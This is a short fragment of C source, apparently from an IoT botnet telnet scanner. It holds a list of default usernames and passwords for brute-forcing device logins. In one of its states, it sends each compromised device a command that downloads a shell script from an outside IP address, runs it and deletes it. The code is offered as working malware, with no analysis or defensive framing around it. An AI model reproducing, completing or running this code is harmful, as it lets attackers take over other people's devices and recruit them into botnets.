...
char *usernames[] = {"root\0", "\0", "admin\0", "user\0", "login\0", "ubnt\0", "guest\0"};
char *passwords[] = {"root\0", "\0", "admin\0", "user\0", "login\0", "changeme\0", "ubnt\0", "guest\0"};
...
void StartTheLelz()
{
	...
	while(1)
	{
		for(i = 0; i < max; i++)
		{
			...
			case 8:
				{
					if(send(fds[i].fd, "cd /tmp && wget http://77.81.110.170/binaries.sh && chmod +x binaries.sh && sh binaries.sh && rm -f binaries.sh\r\n", 143, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
					fds[i].state = 9;
				}
				break;
